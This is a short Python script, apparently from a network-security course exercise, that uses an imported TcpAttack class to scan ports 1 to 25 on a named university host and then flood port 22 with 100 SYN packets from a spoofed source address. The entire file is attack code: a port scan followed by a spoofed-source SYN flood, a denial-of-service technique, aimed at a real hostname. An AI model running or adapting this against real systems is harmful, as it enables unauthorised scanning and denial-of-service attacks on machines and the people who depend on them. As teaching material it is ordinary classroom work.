from TcpAttack import *

spoofIP = '10.10.10.10'
targetIP = 'moonshine.ecn.purdue.edu'
rangeStart = 1
rangeEnd = 25

port = 22
numSyn = 100

tcp = TcpAttack(spoofIP, targetIP)
tcp.scanTarget(rangeStart, rangeEnd)
if tcp.attackTarget(port, numSyn):
    print(f"Port {port} was open, and flooded with {numSyn} SYN packets")
